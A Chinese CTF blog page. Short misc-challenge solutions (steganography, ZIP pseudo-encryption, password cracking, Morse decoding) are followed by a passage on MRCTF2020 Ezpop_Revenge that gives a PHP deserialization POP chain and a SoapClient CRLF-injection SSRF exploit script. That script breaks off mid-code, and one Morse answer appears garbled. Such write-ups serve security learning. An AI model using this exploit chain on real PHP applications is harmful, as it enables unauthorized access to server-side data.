<h2 id="N种方式解决"><a href="#N种方式解决" class="headerlink" title="N种方式解决"></a>N种方式解决</h2><p>在网页中打开（写个html代码）</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>很显然啊 图片长宽不对<br>在010中打开 调整长高<br>18、19位是长，22、23是宽<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013164208.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013164404.png" alt="img" style="zoom:67%;"></p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>010中打开 搜索flag 或拉到底</p>
<h2 id="基础破解-rar"><a href="#基础破解-rar" class="headerlink" title="基础破解 rar"></a>基础破解 rar</h2><p>使用rar破解工具</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>看到RGB中的0通道上面有一行内容</p>
<p>先选择analyse -&gt;data extract-&gt;save bin保存为png 扫描一下<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013172408.png" alt="img" style="zoom:67%;"><br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211013172421.png" alt="img" style="zoom:67%;"></p>
<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>记事本打开（改后缀）</p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>就是这个zip</p>
<p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包</p>
<p>一个 ZIP 文件由<strong>三个部分</strong>组成：</p>
<p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p>
<p><strong>压缩源文件数据区</strong>：</p>
<p>50 4B 03 04：这是头文件标记（0x04034b50）</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>00 00：扩展记录长度</p>
<p><strong>压缩源文件目录区</strong>：</p>
<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p>
<p>3F 00：压缩使用的 pkware 版本</p>
<p>14 00：解压文件所需 pkware 版本</p>
<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p>08 00：压缩方式</p>
<p>5A 7E：最后修改文件时间</p>
<p>F7 46：最后修改文件日期</p>
<p>16 B5 80 14：CRC-32校验（1480B516）</p>
<p>19 00 00 00：压缩后尺寸（25）</p>
<p>17 00 00 00：未压缩尺寸（23）</p>
<p>07 00：文件名长度</p>
<p>24 00：扩展字段长度</p>
<p>00 00：文件注释长度</p>
<p>00 00：磁盘开始号</p>
<p>00 00：内部文件属性</p>
<p>20 00 00 00：外部文件属性</p>
<p>00 00 00 00：局部头部偏移量</p>
<p><strong>压缩源文件目录结束标志</strong>：</p>
<p>50 4B 05 06：目录结束标记</p>
<p>00 00：当前磁盘编号</p>
<p>00 00：目录区开始磁盘编号</p>
<p>01 00：本磁盘上纪录总数</p>
<p>01 00：目录区中纪录总数</p>
<p>59 00 00 00：目录区尺寸大小</p>
<p>3E 00 00 00：目录区对第一张磁盘的偏移量</p>
<p>00 00：ZIP 文件注释长度</p>
<p>因此，根据此题目来看： </p>
<p>压缩源文件数据区：50 4B 03 04：这是头文件标记<br>然后我们直接搜索加密方式<br>0900 说明是有加密，0800说明无加密</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014141943.png" alt="img"></p>
<p>接下来使用其他解压软件打开就行了，这里用得是winrar</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>直接搜索flag就行了</p>
<h2 id="镜子里的世界"><a href="#镜子里的世界" class="headerlink" title="镜子里的世界"></a>镜子里的世界</h2><p>使用stegslove 打开，点击extract preview功能，选取最低0通道，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014143253.png" alt="img" style="zoom: 80%;"><br>打开即可看到flag</p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>在010editor中发现信息<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014143814.png" alt="img" style="zoom:67%;"></p>
<p>使用分离工具分离一下<br>然后zip密码爆破一下</p>
<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014145956.png" alt="img" style="zoom:50%;">
应该又是要分离一下文件，分离 以后需要密码，再回去看 发现010editor有说
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014153055.png" alt="img" style="zoom:67%;">

<h2 id="escape-cap"><a href="#escape-cap" class="headerlink" title="escape cap"></a>escape cap</h2><p>追踪tcp流即可</p>
<h2 id="另一个世界"><a href="#另一个世界" class="headerlink" title="另一个世界"></a>另一个世界</h2><p>文件尾巴，然后二进制转字符串即可z</p>
<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>图片隐写 使用010打开，直接点击搜索类型——text，然后点击搜索flag即可</p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>steg打开，使用bin保存，然后保存为zip，解压以后得到的文件，使用010打开，然后搜索{<br>就可以找到flag<br><strong>这里说一下思路</strong>感觉没有提示，单纯让你就是硬试？所以小结一下</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>遇到图片——010editor打开试试，全局搜索flag、txt、zip等文件，如果有，就去分离，没有的话就考虑是否隐藏在LSB中，所以分离0通道导出为bin，然后尝试，也许是jpg，也许是txt，也许是zip，主要看文件头，像这题<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014160407.png" alt="img" style="zoom:67%;"><br>504b0304明显是zip的文件头，所以保存为zip</p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014160952.png" alt="img" style="zoom: 67%;">
下面应该是压缩包的密码，但是没看懂是干个啥
原来是盲文表。。。对照一下:

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kmdonowg</span><br></pre></td></tr></table></figure>

<p>得到了一个音频，听起来就是个莫斯电码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-.-. - …-. .-- .–. . … ----- —… --… …-- …— …–… …— …-- -… --…</span><br></pre></td></tr></table></figure>

<p>flag{wpei08732?23dz}</p>
<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>爆破一下<br><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a><br>brainfuck加密，解密一下:</p>
<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>要我们找webshell文件，这里可以使用linux系统的查找文件内容指令，或者使用D盾，这里试一下D盾，因为D盾后续还可用于awd查找shell文件<br> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014164727.png" alt="img" style="zoom:67%;"></p>
<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>在流量包中可以看到一个很长的东西，感觉是有问题的base64解码一下，可以发现是一个JFIF文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014173329.png" alt="img" style="zoom:67%;"></p>
<p>此网站解码可以直接转成文件<br><a target="_blank" rel="noopener" href="https://the-x.cn/base64">https://the-x.cn/base64</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014174450.jpg" alt="img" style="zoom:67%;">

<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>RouterPassView查看后，搜索username或者password</p>
<h2 id="MISC-来首歌吧"><a href="#MISC-来首歌吧" class="headerlink" title="MISC 来首歌吧"></a>MISC 来首歌吧</h2><p>莫斯密码</p>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>binwalk分离一下文件，可以得到一个压缩文件，zip伪加密，然后将0900改为0800</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014181310.png" alt="img"></p>
<p>然后再linux解压这个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x flag.vmdk -o.&#x2F;</span><br></pre></td></tr></table></figure>

<p>找到 key_part_one 里的 NUL文件 和 key_part_two 里的 where_is_flag_part_two.txt:flag_part_two_is_here.txt<br>注意:windows下解压不会有&lt;where_is_flag_part_two.txt:flag_part_two_is_here.txt这个文件 只有linux用命令解压才会有<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45485719/article/details/107417878">https://blog.csdn.net/weixin_45485719/article/details/107417878</a><br>就可以发现有如下文件:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211014181800.png" alt="img" style="zoom:67%;"></p>
<p>这里是解密网址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.splitbrain.org&#x2F;services&#x2F;ook</span><br></pre></td></tr></table></figure>

<p>flag{N7F5_AD5_i5_funny!}</p>
<h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>010打开，发现flag.txt，然后去kali分离一下得到一个压缩包需要密码</p>
<p>然后又得到一张照片，，啥信息也没看到，原来是需要一个新的工具:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide</span><br><span class="line">将secret.txt文件隐藏到text.jpg中：</span><br><span class="line"># steghide embed -cf test.jpg -ef secret.txt -p 123456</span><br><span class="line"></span><br><span class="line">从text.jpg解出secret.txt:</span><br><span class="line">#steghide extract -sf test.jpg -p 123456</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Blood_Seeker」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Blood_Seeker&#x2F;article&#x2F;details&#x2F;81837571</span><br></pre></td></tr></table></figure>

<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>为了校赛做了一下misc，单纯学一下基本操作:<br>1.压缩文件:zip:考虑zip爆破，或者zip伪加密<br>   rar:使用rar爆破密码工具<br>2.图片——隐写：<br>010打开，直接搜索flag、txt、jpg等，看看有没有隐藏，分离一下<br>steg工具，lsb的0通道合成一下导出为bin 看一下文件头是个啥，保存为特定的文件就行了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/10/MRCTF2020/">MRCTF2020</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-10</time><div class="content"><h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><a target="_blank" rel="noopener" href="http://www.zip源码泄露,下载下来审计一下,有一个flag.php,看起来是需要ssrf漏洞的因为需要你访问的来源是127.0.0.1/">www.zip源码泄露，下载下来审计一下，有一个flag.php，看起来是需要SSRF漏洞的因为需要你访问的来源是127.0.0.1</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>毕竟是框架题，看了一下，应该是要反序列化找ssrf的漏洞的位点然后去打，全局搜索一下反序列化函数，可以发现，我们传入的coincidence[‘hello’], $this-&gt;coincidence[‘world’]会被分为两个部分传入Typecho_Db</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>传入之后，在这里进行进行了一个拼接,并在最后实例化了这个类,可以看到这里提示了一个tostring<br>方法，所以我们就去找找Typecho_Db，看看是否有这个tostring方法，可以进行操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">       $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//实例化适配器对象</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现，这里有一个tostring方法可以进行操作，其实链子到这里就似乎已经断了，但是该如何实现ssrf呢？就要想到一个php的内置类soapclient，而这里有个点，_adapter-&gt;parseSelect，如果将adapter赋值为这个类，那么就会调用这个类中不存在的方法，相当于触发了其中的call函数，并且这里还有可控的参数供我们写入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">&#x27;*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;fields&#x27;</span> =&gt; <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;join&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">&#x27;where&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;offset&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;having&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;rows&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>梳理一下pop链的逻辑<br>1.HelloWorld_Plugin为pop链反序列化的入口，跳转至HelloWorld_DB类中进行Typecho_Db进行一个初始化，并通过concidence传入数值<br>2.通过tostring跳转至Typecho_Db的tostring魔术方法中<br>3.针对adatpter的一个调用赋值为sopa类并进行sopa类的call方法的调用，最后利用这个call方法进行一个ssrf发送报文实现flag的获取</p>
<p>所以初步的一个pop链就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=<span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild=<span class="keyword">array</span>(<span class="string">&quot;action&quot;</span>=&gt;<span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们要将flag带出来，还需要吧自己的phpsessid传过来，然而soap并不能设置cookie，因此需要crlf，soapclient可以这只ua，只要在ua后加上\r\nCookie：PHPSESSID=xxx,就可以为http头添加一个新的cookie字段，这样就可以带出session了，最后就是寻找一下其中的路由即可，<br>在/var/Typecho/Plugin.php 就有如下路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> */</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params">$pluginName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::$_plugins[<span class="string">&#x27;activated&#x27;</span>][$pluginName] = <span class="built_in">self</span>::$_tmp;</span><br><span class="line">    <span class="built_in">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在后面看了题解，发现这题有一个坑，就是这里private属性不能单纯的使用%00绕过需要将其转为十六进制才行<br>所以最终的脚本如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=<span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=abcd&#x27;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.join(<span class="string">&quot;\r\n&quot;</span>,$headers).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild=<span class="keyword">array</span>(<span class="string">&quot;action&quot;</span>=&gt;<span class="string">&quot;SELECT&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $str);</span><br><span class="line">    $newstr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/00/&#x27;</span>, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i - <span class="number">2</span>] = preg_replace(<span class="string">&#x27;/s/&#x27;</span>, <span class="string">&quot;S&quot;</span>, $arr[$i - <span class="number">2</span>]);</span><br><span class="line">        